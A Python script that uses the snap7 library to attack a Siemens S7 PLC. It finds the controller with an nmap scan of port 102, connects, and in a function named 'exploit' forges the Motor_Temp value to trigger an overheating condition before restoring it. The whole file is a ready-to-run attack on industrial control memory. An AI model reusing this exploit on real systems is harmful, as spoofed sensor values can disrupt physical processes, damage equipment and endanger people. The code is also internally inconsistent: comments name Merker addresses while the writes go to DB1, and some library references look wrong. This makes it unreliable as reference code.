import snap7
import struct
import time
import subprocess
import re

# Configuration -  Adjust these based on your actual setup.
PLC_RACK = 0
PLC_SLOT = 1
MOTOR_TEMP_ADDRESS = 7  # MW7 - Address of Motor_Temp in memory
ACTIVATE_FAN_A_ADDRESS = 0 # M0.0
ACTIVATE_FAN_B_ADDRESS = 0 # M0.1
OVERHEATING_CHECK_ADDRESS = 0 #M0.2

# Exploit parameters
TEMPERATURE_TO_TRIGGER_OVERHEAT = 450  # Temperature to force "Motor_Temp" above a threshold
TEMP_RETURN_TO_NORMAL = 250 # Temperature to return to normal state

# Function to find the PLC's IP address (if needed)
def find_plc_ip():
    """
    Attempts to find the PLC's IP address by scanning the network.
    This is a rudimentary example and might require adjustments 
    depending on your network configuration and tools available.
    """
    try:
        #  This uses nmap, which needs to be installed.
        #  Consider other methods like pinging a range or using vendor-specific tools.
        result = subprocess.run(['nmap', '-p', '102', '192.168.1.0/24'], capture_output=True, text=True)
        output = result.stdout
        # Regex to find IP addresses with port 102 open (Siemens S7 port)
        match = re.search(r'Nmap scan report for (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}).*102/tcp open', output)
        if match:
            return match.group(1)
        else:
            print("PLC IP address not found using nmap.  Please specify it manually.")
            return None
    except FileNotFoundError:
        print("nmap is not installed. Please install it or specify the PLC IP manually.")
        return None


def connect_to_plc(plc_ip):
    """Connects to the PLC using Snap7."""
    plc = snap7.client.Client()
    plc.connect(plc_ip, PLC_RACK, PLC_SLOT)
    if plc.get_connected():
        print(f"Successfully connected to PLC at {plc_ip}")
        return plc
    else:
        print(f"Failed to connect to PLC at {plc_ip}")
        return None

def read_memory(plc, area, db_number, start, size):
    """Reads a block of memory from the PLC."""
    return plc.read_area(area, db_number, start, size)

def write_memory(plc, area, db_number, start, data):
    """Writes a block of memory to the PLC."""
    plc.write_area(area, db_number, start, data)

def set_motor_temperature(plc, temperature):
    """Sets the 'Motor_Temp' variable in the PLC."""
    # Motor_Temp is an INT (2 bytes) at MW7
    data = struct.pack(">h", temperature) # ">h" for big-endian short (2 bytes)
    write_memory(plc, snap7.util.S7AreaDB, 1, MOTOR_TEMP_ADDRESS, data) # Changed to AreaDB and DB1

def read_bool(plc, area, db_number, byte_address, bit_number):
        """Reads a single boolean value from the PLC."""
        byte_data = read_memory(plc, area, db_number, byte_address, 1)
        value = snap7.util.get_bool(byte_data, 0, bit_number)
        return value

def write_bool(plc, area, db_number, byte_address, bit_number, value):
    """Writes a single boolean value to the PLC."""
    byte_data = read_memory(plc, area, db_number, byte_address, 1) # Read the existing byte
    snap7.util.set_bool(byte_data, 0, bit_number, value)       # Modify the specific bit
    write_memory(plc, area, db_number, byte_address, byte_data)   # Write the modified byte back

def exploit(plc):
    """
    Executes the exploit:
    1.  Force "Motor_Temp" to a high value to trigger an overheating condition.
    2.  Wait a bit for the system to react.
    3.  Return "Motor_Temp" to a normal value.
    """
    print("Starting Exploit...")

    # 1. Force overheating
    print(f"Forcing Motor_Temp to {TEMPERATURE_TO_TRIGGER_OVERHEAT}")
    set_motor_temperature(plc, TEMPERATURE_TO_TRIGGER_OVERHEAT)
    time.sleep(5) # Wait for the PLC logic to react

    # 2. Check for a status change (e.g., "Overheating_Check" is TRUE)
    overheating_status = read_bool(plc, snap7.util.S7AreaDB, 1, OVERHEATING_CHECK_ADDRESS, 2) # Check Overheating_Check at M0.2

    if overheating_status:
        print("Overheating condition successfully triggered!")
    else:
        print("Overheating condition NOT triggered. PLC logic might be different than expected.")

    # 3. Restore normal temperature
    print(f"Returning Motor_Temp to {TEMP_RETURN_TO_NORMAL}")
    set_motor_temperature(plc, TEMP_RETURN_TO_NORMAL)
    time.sleep(2) # Wait for the PLC logic to react

    print("Exploit completed.")

def main():
    """Main function to connect, exploit, and disconnect from the PLC."""
    plc_ip = find_plc_ip()  # Attempt to find the PLC's IP
    if not plc_ip:
        plc_ip = input("Enter the PLC IP address manually: ") # Prompt for manual input if not found
        if not plc_ip:
            print("No PLC IP address provided. Exiting.")
            return

    plc = connect_to_plc(plc_ip)
    if plc:
        try:
            exploit(plc)
        finally:  # Ensure disconnection even if errors occur
            plc.disconnect()
            print("Disconnected from PLC.")
    else:
        print("Failed to connect to the PLC.  Exiting.")


if __name__ == "__main__":
    main()